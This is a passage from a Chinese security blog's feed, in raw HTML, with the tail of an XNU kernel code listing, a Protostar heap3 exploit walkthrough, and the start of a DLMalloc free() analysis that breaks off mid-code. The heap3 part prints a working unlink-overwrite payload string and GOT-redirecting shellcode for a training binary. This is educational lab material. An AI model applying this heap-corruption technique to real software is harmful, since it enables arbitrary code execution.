o-&gt;release();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>)</div><div class="line">&#123;</div><div class="line">   ok = <span class="built_in">set</span>-&gt;setObject(o);</div><div class="line">   o-&gt;release();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    assert(!parent);</div><div class="line">    result = o;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (newCollect)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (!end)</div><div class="line">&#123;</div><div class="line">stackIdx++;</div><div class="line">setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</div><div class="line"><span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</div><div class="line">parent = o;</div><div class="line">dict   = newDict;</div><div class="line"><span class="built_in">array</span>  = newArray;</div><div class="line"><span class="built_in">set</span>    = newSet;</div><div class="line">end    = <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (end)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (!stackIdx) <span class="keyword">break</span>;</div><div class="line">parent = stackArray[stackIdx];</div><div class="line">DEBG(<span class="string">"--stack[%d] %p\n"</span>, stackIdx, parent);</div><div class="line">stackIdx--;</div><div class="line"><span class="built_in">set</span>   = <span class="number">0</span>; </div><div class="line">dict  = <span class="number">0</span>; </div><div class="line"><span class="built_in">array</span> = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (!(dict = OSDynamicCast(OSDictionary, parent)))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (!(<span class="built_in">array</span> = OSDynamicCast(OSArray, parent))) ok = (<span class="number">0</span> != (<span class="built_in">set</span> = OSDynamicCast(OSSet, parent)));</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">DEBG(<span class="string">"ret %p\n"</span>, result);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (objsCapacity)  kfree(objsArray,  objsCapacity  * <span class="keyword">sizeof</span>(*objsArray));</div><div class="line"><span class="keyword">if</span> (stackCapacity) kfree(stackArray, stackCapacity * <span class="keyword">sizeof</span>(*stackArray));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!ok &amp;&amp; result)</div><div class="line">&#123;</div><div class="line">result-&gt;release();</div><div class="line">result = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> (result);</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，
      
    
    </summary>
    
      <category term="iOS&amp;macOS内核漏洞分析" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOS-macOS%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PoC分析" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOS-macOS%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/PoC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Pegasus" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"/>
    
      <category term="cve" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"/>
    
      <category term="CVE-2016-4655" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"/>
    
      <category term="CVE-2016-4656" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"/>
    
      <category term="PoC" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-滥用堆metadata重定向程序执行</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/</id>
    <published>2017-04-26T13:24:19.000Z</published>
    <updated>2017-05-02T14:35:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">linux堆管理DLMalloc的分析</a>这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *a, *b, *c;</div><div class="line"></div><div class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">free</span>(c);</div><div class="line">  <span class="built_in">free</span>(b);</div><div class="line">  <span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到<code>winner()</code>函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知<code>free()</code>函数中的<code>unlink()</code>函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行<code>winner()</code>函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。<br>就照着这个思路来一步步实现这个过程。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.输入<code>AAAA</code> <code>BBBB</code> <code>CCCC</code>然后free前后后观察堆结构<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-0.png?raw=true" alt="0-0"><br>由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-1.png?raw=true" alt="0-1"><br>因为chunk的大小<80字节，所以free后存在单链表的fastbin中，`1-->2–&gt;3–&gt;null`的方式连接  </80字节，所以free后存在单链表的fastbin中，`1--></p><p>2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-2.png?raw=true" alt="0-2"><br>因为我们准备向前合并，所以将preinuse位设为1，即64+1=65</p><p>3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。<br>构造字符串：<br><code>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x0c\xc0\x04\x08</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-3.png?raw=true" alt="0-3"></p><p>4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-4.png?raw=true" alt="0-4"><br>这里我们用在线的转换工具下面的汇编转化为x86指令字符串</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x8048864</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">eax</span></div></pre></td></tr></table></figure><p><code>0x8048864</code>为winner()函数地址</p><p>5.将上面的shellcode写入第一个chunk那里，here we hack！<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-5.png?raw=true" alt="0-5"><br>下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-6.png?raw=true" alt="0-6"><br>GoT地址已经修改，下面可以看到已经执行了winnwe()函数<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-7.png?raw=true" alt="0-7"></p><h2 id="0x04-一点补充"><a href="#0x04-一点补充" class="headerlink" title="0x04 一点补充"></a>0x04 一点补充</h2><p>在上面构造chunk中，也许你已经发现了chunk大小为<code>0xfffffffc</code>，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看<br><a href="http://phrack.org/issues/57/9.html#article" target="_blank" rel="external">Once upon a free()</a>这篇文章，简单的说就是当某个数加上<code>0xfffffffc</code>时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。</p><h2 id="0x05-堆漏洞学习总结"><a href="#0x05-堆漏洞学习总结" class="headerlink" title="0x05 堆漏洞学习总结"></a>0x05 堆漏洞学习总结</h2><p>目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对&lt;a href=&quot;ht
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="metadata" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"/>
    
      <category term="DLMalloc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Linux堆分配器-DLMalloc</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/</id>
    <published>2017-04-23T04:16:00.000Z</published>
    <updated>2017-05-02T14:36:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。</p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>1.DLMalloc<br>2.内存Chunk<br>3.Bin<br>4.malloc源码free()函数分析</p><h2 id="0x02-DLMalloc"><a href="#0x02-DLMalloc" class="headerlink" title="0x02 DLMalloc"></a>0x02 DLMalloc</h2><p>Doug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。<br>明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点：</p><ul><li>稳定性(stability)</li><li>性能(performance)</li><li>避免碎片化(avoidance of fragmentation)</li><li>低空间开销(low space overhead）<br>根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。</li></ul><h2 id="0x03-内存chunk"><a href="#0x03-内存chunk" class="headerlink" title="0x03 内存chunk"></a>0x03 内存chunk</h2><p>1.什么是chunk？<br>chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。</p><p>2.数据结构</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span></span> &#123;</div><div class="line">INTERNAL_SIZE_T prev_size; <span class="comment">//当前chunk前一个chunk的大小，仅在前一个为freed才使用</span></div><div class="line">INTERNAL_SIZE_T size;      <span class="comment">//当前chunk的大小</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span></span> * fd;  <span class="comment">//如果当前为释放chunk，指向双向free list中前一个chunk</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span></span> * bk;  <span class="comment">//如果当前为释放chunk，指向双向free list中后一个chunk</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例:</p><ul><li>allocate chunk<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/0-0.png?raw=true" alt="0-0"></li></ul><ul><li>freed chunk<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/0-1.png?raw=true" alt="0-1"></li></ul><p>3.更多细节<br>因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？<br>然后可以想到有一个最小chunk的存在，其大小为16字节()。  </p><p>4.特殊chunk<br>top chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。</p><p>last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk.</p><h2 id="0x04-Bin"><a href="#0x04-Bin" class="headerlink" title="0x04 Bin"></a>0x04 Bin</h2><p>chunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。<br>这里我主要介绍fsatbin和normalbin</p><p>(1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。<br>(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。</p><h2 id="0x05-free-源代码分析及相关细节"><a href="#0x05-free-源代码分析及相关细节" class="headerlink" title="0x05 free()源代码分析及相关细节"></a>0x05 free()源代码分析及相关细节</h2><p><code>free(void *mem)--&gt;__libc_free(void *mem)</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">__libc_free (void *mem)</div><div class="line">&#123;</div><div class="line">  mstate ar_ptr<span class="comment">;</span></div><div class="line">  mchunkptr p<span class="comment">;                          /* chunk corresponding to mem */</span></div><div class="line"></div><div class="line">  void (*hook) (void *, const void *)</div><div class="line">    = atomic_forced_read (__free_hook)<span class="comment">;</span></div><div class="line">  if (__builtin_expect (hook != NULL, <span class="number">0</span>))</div><div class="line">    &#123;</div><div class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>))<span class="comment">;</span></div><div class="line">      return<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">  if (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></div><div class="line">    return<span class="comment">;</span></div><div class="line"></div><div class="line">  p = mem2chunk (mem)<span class="comment">;</span></div><div class="line"></div><div class="line">  if (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></div><div class="line">         Dumped fake mmapped chunks do not affect the threshold.  */</div><div class="line">      if (!mp_.no_dyn_threshold</div><div class="line">          &amp;&amp; <span class="keyword">chunksize_nomask </span>(p) &gt; mp_.mmap_threshold</div><div class="line">          &amp;&amp; <span class="keyword">chunksize_nomask </span>(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</div><div class="line">          &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</div><div class="line">        &#123;</div><div class="line">          mp_.mmap_threshold = <span class="keyword">chunksize </span>(p)<span class="comment">;</span></div><div class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold<span class="comment">;</span></div><div class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</div><div class="line">                      mp_.mmap_threshold, mp_.trim_threshold)<span class="comment">;</span></div><div class="line">        &#125;</div><div class="line">      munmap_chunk (p)<span class="comment">;</span></div><div class="line">      return<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">  ar_ptr = arena_for_chunk (p)<span class="comment">;</span></div><div class="line">  _int_free (ar_ptr, p, <span class="number">0</span>)<span class="comment">; //跳转到_int_free</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们先不关注其他的，只需要知道会调用_int_free就就可以了</p><p><code>__libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock)</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div></pre></td><td class="code"><pre><div class="line">static void</div><div class="line"><span class="variable">_int_free</span> (mstate av, mchunkptr p, int have_lock)</div><div class="line">&#123;</div><div class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;        <span class="comment">/* 当前chunk的大小 */</span></div><div class="line">  mfastbinptr *fb;             <span class="comment">/* 相关的fastbin */</span></div><div class="line">  mchunkptr nextchunk;         <span class="comment">/* 下一个相邻的chunk */</span></div><div class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* 下一个chunk的大小 */</span></div><div class="line">  int nextinuse;               <span class="comment">/* 下一个chunk正在使用时为真 */</span></div><div class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* 前一个chunk的大小 */</span></div><div class="line">  mchunkptr bck;               <span class="comment">/* 指向free链表中向后一个chunk */</span></div><div class="line">  mchunkptr fwd;               <span class="comment">/* 指向free链表中向前一个chunk */</span></div><div class="line"></div><div class="line">  const char *errstr = NULL;</div><div class="line">  int <span class="built_in">locked</span> = 